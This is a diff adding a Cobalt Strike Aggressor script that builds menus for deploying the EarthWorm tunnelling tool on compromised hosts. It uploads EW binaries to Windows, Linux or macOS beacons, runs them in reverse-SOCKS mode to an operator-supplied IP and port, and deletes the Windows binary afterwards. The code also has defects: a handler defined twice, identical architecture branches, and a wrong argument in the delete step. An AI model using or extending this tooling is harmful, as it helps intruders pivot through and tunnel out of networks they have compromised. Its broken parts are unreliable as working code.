@@ -1,0 +1,105 @@
+menu "EW" {
+	menu "上传EW" {
+		item "Windows" {
+			$bid = $1;
+			$dialog = dialog("上传EW", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &EW);
+			drow_text($dialog, "UploadPath",  "上传路径: "); 	
+			dbutton_action($dialog, "上传");
+			dialog_show($dialog);
+		}
+		sub EW {
+		    bcd($bid, $3['UploadPath']);
+		    if (-is64 $bid['id']) {
+		        bupload($bid, script_resource("/script/ew/ew_for_Win.exe"));
+		    }else{
+		        bupload($bid, script_resource("/script/ew/ew_for_Win.exe"));
+		    }
+		}
+	    item "Linux" {
+			$bid = $1;
+			$dialog = dialog("上传EW", %(UploadPath => "/usr/local", bid => $bid), &EW1);
+			drow_text($dialog, "UploadPath",  "上传路径: "); 	
+			dbutton_action($dialog, "上传");
+			dialog_show($dialog);
+		}
+		sub EW1 {
+		    bcd($bid, $3['UploadPath']);
+		    if (-is64 $bid['id']) {
+		        bupload($bid, script_resource("/script/ew/ew_for_linux64"));
+		    }else{
+		        bupload($bid, script_resource("/script/ew/ew_for_Linux32"));
+		    }
+	    }
+	    item "MAC" {
+			$bid = $1;
+			$dialog = dialog("上传EW", %(UploadPath => "/usr/local", bid => $bid), &EW1);
+			drow_text($dialog, "UploadPath",  "上传路径: "); 	
+			dbutton_action($dialog, "上传");
+			dialog_show($dialog);
+		}
+		sub EW1 {
+	    	bcd($bid, $3['UploadPath']);
+	        bupload($bid, script_resource("/script/ew/ew_for_MacOSX64"));
+	    }
+	}
+	
+	menu "运行EW"{
+		item "Windows" {
+			$bid = $1['@'];
+		    $Dialog = dialog("运行EW", %(ip => "", port => "",bid => $bid),&ew1_run);
+		    drow_text($Dialog, "ip", "ip: ");
+		    drow_text($Dialog, "port", "port: ");
+		    dbutton_action($Dialog, "运行");
+		    dialog_show($Dialog);
+		}
+		sub ew1_run{
+		    local('$Name $port');
+		    $Name = $3['ip'];
+		    $port = replace($3['port'], "\"", "");
+			bshell($bid, "ew_for_Win.exe -s rssocks -d  $+ $Name -e  $+ $port");
+		}
+		item "Linux" {
+			$bid = $1['@'];
+		    $Dialog = dialog("运行EW", %(ip => "", port => "",bid => $bid),&ew2_run);
+		    drow_text($Dialog, "ip", "ip: ");
+		    drow_text($Dialog, "port", "port: ");
+		    dbutton_action($Dialog, "运行");
+		    dialog_show($Dialog);
+		}
+		sub ew2_run{
+		    local('$Name $port');
+		    $Name = $3['ip'];
+		    $port = replace($3['port'], "\"", "");
+		    if (-is64 $bid['id']) {
+		        bshell($bid, "chmod +x ./ew_for_linux64 && ./ew_for_linux64 -s rssocks -d  $+ $Name -e  $+ $port");
+		    }else{
+		        bshell($bid, "chmod +x ./ew_for_Linux32 && ./ew_for_Linux32 -s rssocks -d  $+ $Name -e  $+ $port");
+		    }
+			
+		}
+		item "MAC" {
+			$bid = $1['@'];
+		    $Dialog = dialog("运行EW", %(ip => "", port => "",bid => $bid),&ew3_run);
+		    drow_text($Dialog, "ip", "ip: ");
+		    drow_text($Dialog, "port", "port: ");
+		    dbutton_action($Dialog, "运行");
+		    dialog_show($Dialog);
+		}
+		sub ew3_run{
+		    local('$Name $port');
+		    $Name = $3['ip'];
+		    $port = replace($3['port'], "\"", "");
+		    bshell($bid, "chmod +x ./ew_for_MacOSX64 && ./ew_for_MacOSX64 -s rssocks -d  $+ $Name -e  $+ $port");
+			
+		}
+	    
+	}
+
+
+	item "删除ew"{
+		local('$bid');
+		foreach $bid ($1){
+			bshell($1, "del /f /s /q ew_for_Win.exe");
+		}
+	}
+}
